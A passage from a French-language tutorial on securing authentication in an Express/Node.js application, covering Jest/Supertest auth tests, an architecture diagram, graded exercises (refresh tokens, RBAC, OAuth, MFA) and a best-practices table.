GOOGLE_CLIENT_ID=xxx.apps.googleusercontent.com
GOOGLE_CLIENT_SECRET=GOCSPX-xxx

# OAuth GitHub
GITHUB_CLIENT_ID=xxx
GITHUB_CLIENT_SECRET=xxx
```

### 15.4 Tests avec Jest et Supertest

```javascript
// tests/auth.test.js
const request = require('supertest');
const app = require('../src/app');
const User = require('../src/models/User.model');
const mongoose = require('mongoose');

describe('Auth System', () => {
  beforeAll(async () => {
    await mongoose.connect(process.env.MONGODB_TEST_URI);
  });

  afterAll(async () => {
    await mongoose.connection.dropDatabase();
    await mongoose.connection.close();
  });

  afterEach(async () => {
    await User.deleteMany({});
  });

  describe('POST /auth/register', () => {
    it('devrait créer un utilisateur et retourner des cookies', async () => {
      const res = await request(app)
        .post('/auth/register')
        .send({
          email: 'test@example.com',
          password: 'Password123!',
          name: 'Test User',
        });

      expect(res.status).toBe(201);
      expect(res.body.user.email).toBe('test@example.com');
      expect(res.body.user.password).toBeUndefined(); // Ne jamais exposer le mdp
      
      const cookies = res.headers['set-cookie'];
      expect(cookies).toBeDefined();
      expect(cookies.some((c) => c.includes('HttpOnly'))).toBe(true);
    });

    it('devrait rejeter un email déjà utilisé', async () => {
      await User.create({
        email: 'existing@example.com',
        password: 'hashed',
        name: 'Existing',
      });

      const res = await request(app)
        .post('/auth/register')
        .send({ email: 'existing@example.com', password: 'test1234', name: 'Test' });

      expect(res.status).toBe(409);
    });
  });

  describe('POST /auth/login', () => {
    it('devrait connecter un utilisateur valide', async () => {
      await request(app)
        .post('/auth/register')
        .send({ email: 'login@test.com', password: 'ValidPass1!', name: 'Login Test' });

      const res = await request(app)
        .post('/auth/login')
        .send({ email: 'login@test.com', password: 'ValidPass1!' });

      expect(res.status).toBe(200);
      expect(res.body.user.email).toBe('login@test.com');
    });

    it('devrait rejeter un mauvais mot de passe', async () => {
      await request(app)
        .post('/auth/register')
        .send({ email: 'user@test.com', password: 'CorrectPass1!', name: 'User' });

      const res = await request(app)
        .post('/auth/login')
        .send({ email: 'user@test.com', password: 'WrongPassword' });

      expect(res.status).toBe(401);
    });
  });

  describe('Routes protégées', () => {
    let authCookies;

    beforeEach(async () => {
      const registerRes = await request(app)
        .post('/auth/register')
        .send({ email: 'protected@test.com', password: 'Pass1234!', name: 'Protected' });
      
      authCookies = registerRes.headers['set-cookie'];
    });

    it('devrait accéder à /api/users/me avec un token valide', async () => {
      const res = await request(app)
        .get('/api/users/me')
        .set('Cookie', authCookies);

      expect(res.status).toBe(200);
      expect(res.body.email).toBe('protected@test.com');
    });

    it('devrait refuser /api/users/me sans token', async () => {
      const res = await request(app).get('/api/users/me');
      expect(res.status).toBe(401);
    });
  });
});
```

---

## 16. Résumé — Diagramme d'architecture complet

```
                    ┌─────────────────────────────────────────┐
                    │           CLIENT (Browser/Mobile)        │
                    │                                          │
                    │  Cookie: access_token (HttpOnly, 15min) │
                    │  Cookie: refresh_token (HttpOnly, 30j)  │
                    │  Cookie: csrf_token (5min, lisible JS)  │
                    └──────────────┬──────────────────────────┘
                                   │ HTTPS
                    ┌──────────────▼──────────────────────────┐
                    │              EXPRESS APP                  │
                    │                                          │
                    │  helmet() → sécurité headers            │
                    │  cors()   → politique origines          │
                    │  session() + Redis → sessions           │
                    │  passport.initialize()                   │
                    │                                          │
                    │  Routes publiques:                       │
                    │  POST /auth/register                     │
                    │  POST /auth/login                        │
                    │  POST /auth/refresh                      │
                    │  GET  /auth/google                       │
                    │  GET  /auth/google/callback              │
                    │                                          │
                    │  Routes protégées:                       │
                    │  authenticate() → JWT verify             │
                    │  requirePermission() → RBAC check        │
                    │  requirePolicy() → ABAC check            │
                    │  GET  /api/users/me                      │
                    │  GET  /api/users (admin only)            │
                    └──────┬────────────┬────────────────────┘
                           │            │
           ┌───────────────▼──┐   ┌────▼──────────────────┐
           │    MongoDB        │   │         Redis           │
           │                  │   │                         │
           │  users           │   │  sessions               │
           │  refreshTokens   │   │  rate-limiting          │
           │                  │   │  cache                  │
           └──────────────────┘   └─────────────────────────┘
```

---

## 17. Challenges et exercices

### Challenge 1 — Débutant
Implémente un système d'authentification basique avec :
- Inscription / connexion avec email + mot de passe
- JWT stocké en Cookie HttpOnly
- Route `/api/me` protégée par middleware `authenticate`
- Tests Jest couvrant les cas nominaux et erreurs

### Challenge 2 — Intermédiaire
Ajoute à ton système :
- Refresh token avec rotation (stocké en base, expiré par TTL MongoDB)
- RBAC avec 3 rôles : `user`, `moderator`, `admin`
- Route `/api/admin/users` accessible uniquement aux admins
- Détection de réutilisation de refresh token avec révocation

### Challenge 3 — Avancé
Étends le système avec :
- OAuth Google complet (flux Authorization Code + PKCE côté SPA)
- MFA TOTP avec speakeasy (setup + vérification + 10 codes de sauvegarde)
- ABAC pour les articles : l'auteur peut modifier/supprimer ses propres articles, les modos peuvent supprimer tout article, les admins font tout
- Tests d'intégration avec base MongoDB de test et mock des appels Google OAuth

### Challenge Bonus — Expert
- Implémenter la rotation automatique des clés RS256 avec un endpoint JWKS (`/.well-known/jwks.json`)
- Ajouter un rate-limiter Redis sur `/auth/login` (5 tentatives / IP / 15 minutes)
- Implémenter un audit log en base : chaque action auth (login, logout, token refresh, MFA verify) est tracée avec IP, UserAgent, timestamp, résultat

---

## 18. Récapitulatif — Tableau des bonnes pratiques

| Concept | À faire ✅ | À éviter ❌ |
|---------|-----------|------------|
| JWT Secret | 64 bytes aléatoires, env var | Chaîne en dur dans le code |
| Access Token durée | 5-15 minutes | 24h ou plus |
| Refresh Token | Opaque, haché en DB, rotaté | JWT, non révocable |
| Stockage token | Cookie HttpOnly | localStorage (XSS) |
| Mot de passe | bcrypt cost 12+ | md5, sha1, en clair |
| CSRF | SameSite=Strict ou Double Submit | Aucune protection |
| OAuth state | Valider, usage unique | Ignorer ou ne pas générer |
| MFA codes backup | Hachés en DB, usage unique | En clair en DB |
| Erreurs auth | Message générique | "Email invalide" ou "Mauvais mdp" |
| Payload JWT | ID, email, roles (minimal) | Mot de passe, données sensibles |

> [!tip] Lecture complémentaire
> - RFC 7519 (JWT), RFC 6238 (TOTP), RFC 7636 (PKCE)
> - OWASP Authentication Cheat Sheet
> - Auth0 documentation (référence industrielle de l'identité)
> - Cours suivant : **API Security — Rate Limiting, OWASP Top 10 et Audit Logging**
